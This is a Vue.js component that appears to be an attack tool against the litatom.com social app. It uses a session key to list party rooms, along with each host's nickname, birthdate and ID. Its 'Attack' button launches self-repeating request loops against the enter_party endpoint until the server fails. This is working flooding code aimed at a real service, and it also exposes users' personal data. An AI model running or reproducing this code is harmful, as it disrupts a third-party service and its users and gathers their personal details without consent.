<template>
  <div id="app">
    <b-container v-if="!key">
        <b-jumbotron header="Tooling" lead="Author">
          
        </b-jumbotron>

        <b-form-group
          horizontal
          :label-cols="4"
          label="Enter your key"
        >
          <b-form-input v-model.trim="key"></b-form-input>
        </b-form-group>
    </b-container>
    <b-container v-else>
      <b-jumbotron class="request">
        <span v-for="i in node" :key="i" class="dot"></span>
      </b-jumbotron>
        <b-row>
          <b-col>
            <b-button @click="getRoomList">Refresh Room</b-button>
          </b-col>
        </b-row>
        <br/>
        <b-row>
          <b-table dark small hover :items="roomList" :busy="isBusy" :fields="fields">
            <template v-slot:table-busy>
              <div class="text-center text-danger my-2">
                <b-spinner class="align-middle"></b-spinner>
                <strong>Loading...</strong>
              </div>
            </template>
            <template v-slot:cell(actions)="row">
              <b-overlay
                :show="row.item.active"
                rounded
                opacity="0.6"
                spinner-small
                spinner-variant="primary"
                class="d-inline-block"
                @hidden="onHidden"
              >
              <b-button variant="danger" size="sm" @click="loopAttack(row.item)">
                Attack
              </b-button>
              </b-overlay>
            </template>
          </b-table>
        </b-row>
        <b-modal id="bv-modal-example" hide-footer>
          <div class="d-block text-center">
            <h3>Done!</h3>
          </div>
          <b-button class="mt-3" block @click="hideModal()">Close Me</b-button>
        </b-modal>
    </b-container>
  </div>
</template>

<script>
// import axios from "axios"

export default {
  name: 'App',
  computed: {
    
  },
  mounted() {
    this.getRoomList();
    setInterval(() => {
      this.getRoomList();
    }, 180000)
  },
  watch: {
  },
  beforeDestroy() {
      this.clearTimeout()
  },
  data () {
    return {
      busy: false,
      node: 0,
      modalShow: false,
      timeout: null,
      isBusy: false,
      objAttacking: [],
      stateAttacking: 'Free',
      fields: [
        {
          key: 'affiliations_count',
          sortable: true,
          label: 'Online'
        },
        {
          key: 'name',
          label: 'Name Room',
          sortable: true,
        },
        {
          key: 'id',
          label: 'Id Room',
          sortable: true,
        },
        {
          key: 'host.nickname',
          sortable: false,
          label: 'Host'
        },
        {
          key: 'host.birthdate',
          label: 'DoB Host',
          sortable: true,
        },
        {
          key: 'host.id',
          label: 'Id Host',
          sortable: true,
        },
        { key: 'actions', label: 'Actions' }
      ],
      roomList: [],
      key: '',
      proxy: 'http://localhost:3000/pipe/',
      state: false,
      roomId: '',
    }
  },
  methods: {
    hideModal() {
      this.modalShow = false;
      this.$bvModal.hide('bv-modal-example')
      this.getRoomList();
    },
    clearTimeout() {
      if (this.timeout) {
        clearTimeout(this.timeout)
        this.timeout = null
      }
    },
    setTimeout(callback) {
      this.clearTimeout()
      this.timeout = setTimeout(() => {
        this.clearTimeout()
        callback()
      }, 5000)
    },
    onHidden() {
      // Return focus to the button once hidden
      this.$refs.button.focus()
    },
    getRoomList () {
      this.isBusy = true;
      var proxyUrl = this.proxy;
      var targetUrl = 'http://www.litatom.com/api/sns/v1/lit/user/get_party_list?page_num=1&page_size=100&loc=US&sid=session.' + this.key + '&version=3.7.1&uuid=1944739c55bbc885';
      fetch(proxyUrl + targetUrl)
      .then(blob => blob.json())
      .then(data => {
        this.roomList = data.data;
        this.roomList = this.roomList.map(obj=> ({ ...obj, active: false }))
        this.isBusy = false;
      })
      .catch(e => {
        this.isBusy = false;
        return e;
      });
    },
    async loopAttack(roomId) {
      roomId.active = true;
      this.stateAttacking = 'Process';
      this.requestRoom(roomId);
      this.requestRoom(roomId);
      this.requestRoom(roomId);
    },
    requestRoom(roomId) {
      var self = this;
      var proxyUrl = this.proxy;
      var targetUrl = "http://www.litatom.com/api/sns/v1/lit/user/enter_party?party_id="+roomId.id+"&loc=US&sid=session."+this.key+"&version=3.7.1&uuid=1944739c55bbc885";
      fetch(proxyUrl + targetUrl)
      .then(blob => blob.json())
      .then(data => {
        if (data.success == true) {
          self.node++;
          self.requestRoom(roomId);
        } else {
          self.node = 0;
          self.stateAttacking = 'DIE'
          if (self.modalShow == false) {
            self.$bvModal.show('bv-modal-example');
          }
          self.modalShow = true
          roomId.active = false
        }
      })
      .catch(e => {
        console.log(e);
        return e;
      });
    }
  }
}
</script>

<style>
#app {
  font-family: Avenir, Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  text-align: center;
  color: #2c3e50;
  margin-top: 60px;
}
body {
  background-color: #16181a !important;
}
.dot {
  height: 15px;
  width: 15px;
  background-color: rgb(8, 255, 41);
  border-radius: 50%;
  display: inline-block;
  margin-right: 5px;
}
.request {
  background-color: #16181a !important;
}
</style>
